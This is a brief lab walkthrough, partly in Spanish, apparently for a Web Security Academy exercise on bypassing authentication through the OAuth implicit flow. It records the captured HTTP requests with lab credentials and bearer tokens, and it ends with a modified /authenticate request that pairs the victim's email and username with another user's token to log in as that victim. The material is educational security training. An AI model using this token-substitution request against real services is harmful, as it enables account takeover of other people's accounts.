---
title: "1 - Authentication bypass via OAuth implicit flow"
---

# 1 - Authentication bypass via OAuth implicit flow

**Implicit Grant Type** (response_type=token) :

```HTTP
GET /auth?client_id=ad8hfc7kpli96shlhi17k&redirect_uri=https://0a57004c03019f8180790d2c00cc0028.web-security-academy.net/oauth-callback&response_type=token&nonce=1699848058&scope=openid%20profile%20email
```

```HTTP
POST /interaction/f7BCf2LSAmq6eUnLqZS3u/login

username=wiener&password=peter
```

```HTTP
GET /auth/f7BCf2LSAmq6eUnLqZS3u
```
```
Redirecting to <a href="https://0a57004c03019f8180790d2c00cc0028.web-security-academy.net/oauth-callback#access_token=cC_H_dhSDbAu56Hp7eCZyzjMPvUia_d_qmfLff8LUop&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email">https://0a57004c03019f8180790d2c00cc0028.web-security-academy.net/oauth-callback#access_token=cC_H_dhSDbAu56Hp7eCZyzjMPvUia_d_qmfLff8LUop&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email</a>
```

```HTTP
GET /oauth-callback
```

```HTTP
GET /me
Authorization: Bearer k53eJUaN5aBcMICb4wCXZJcOKNsAFJUIvVXFu55BdoY
```
```json
{
	"sub":"wiener",
	"name":"Peter Wiener",
	"email":"wiener@hotdog.com",
	"email_verified":true
}
```

Al final de todo el recorrido se hace una petición extraña , simplemente la modificamos para resolver el lab:

```HTTP
POST /authenticate HTTP/2

{
	"email":"carlos@carlos-montoya.net",
	"username":"carlos",
	"token":"k53eJUaN5aBcMICb4wCXZJcOKNsAFJUIvVXFu55BdoY"
}
```
